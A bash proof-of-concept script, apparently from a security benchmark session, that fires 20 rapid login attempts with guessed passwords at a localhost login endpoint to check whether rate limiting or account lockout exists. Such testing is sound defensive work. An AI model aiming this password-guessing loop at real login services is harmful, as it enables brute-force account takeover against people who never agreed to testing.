#!/bin/bash
# POC: Demonstrates missing rate limiting on /api/login.php endpoint by performing 20 consecutive rapid login attempts with different passwords and verifying no HTTP 429, 403, or throttling occurs.
# Target: ./repo
# Created: 2025-12-01T15:58:42.141Z
# Session: benchmark-XBEN-069-24-minbd4jr

# POC for Missing Rate Limiting / Brute Force Protection on Login Endpoint
# Target: http://localhost:8080/api/login.php
# Description: Perform rapid login attempts and verify no rate limiting is in place

TARGET="http://localhost:8080/api/login.php"
USERNAME="testuser"
ATTEMPTS=20
RATE_LIMITED_ATTEMPTS=0
HTTP_429_COUNT=0
HTTP_403_COUNT=0
HTTP_200_COUNT=0

echo "========================================"
echo "Rate Limiting / Brute Force Protection POC"
echo "========================================"
echo "Target: $TARGET"
echo "Username: $USERNAME"
echo "Performing $ATTEMPTS rapid login attempts..."
echo ""

# Perform rapid login attempts
for i in $(seq 1 $ATTEMPTS); do
    PASSWORD="password$i"
    
    # Perform the request and capture both status code and response
    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=$USERNAME&password=$PASSWORD")
    
    HTTP_STATUS=$(echo "$RESPONSE" | tail -n1)
    BODY=$(echo "$RESPONSE" | head -n-1)
    
    # Count status codes
    if [ "$HTTP_STATUS" = "429" ]; then
        HTTP_429_COUNT=$((HTTP_429_COUNT + 1))
        echo "Attempt $i: HTTP $HTTP_STATUS - RATE LIMITED (Retry-After headers present)"
    elif [ "$HTTP_STATUS" = "403" ]; then
        HTTP_403_COUNT=$((HTTP_403_COUNT + 1))
        echo "Attempt $i: HTTP $HTTP_STATUS - ACCOUNT LOCKED"
    elif [ "$HTTP_STATUS" = "200" ]; then
        HTTP_200_COUNT=$((HTTP_200_COUNT + 1))
        echo "Attempt $i: HTTP $HTTP_STATUS - Request processed (No rate limiting)"
    else
        echo "Attempt $i: HTTP $HTTP_STATUS - $BODY"
    fi
    
    # No delay between requests to maximize impact
done

echo ""
echo "========================================"
echo "Results Summary:"
echo "========================================"
echo "HTTP 200 (Successful Requests): $HTTP_200_COUNT"
echo "HTTP 429 (Rate Limited): $HTTP_429_COUNT"
echo "HTTP 403 (Account Locked): $HTTP_403_COUNT"
echo ""

# Check if rate limiting exists
if [ "$HTTP_429_COUNT" -gt 0 ] || [ "$HTTP_403_COUNT" -gt 0 ]; then
    echo "✓ Rate limiting IS implemented"
    exit 0
else
    echo "✓ VULNERABILITY CONFIRMED: No rate limiting detected!"
    echo "  All $ATTEMPTS requests were processed without any throttling or blocking."
    exit 0
fi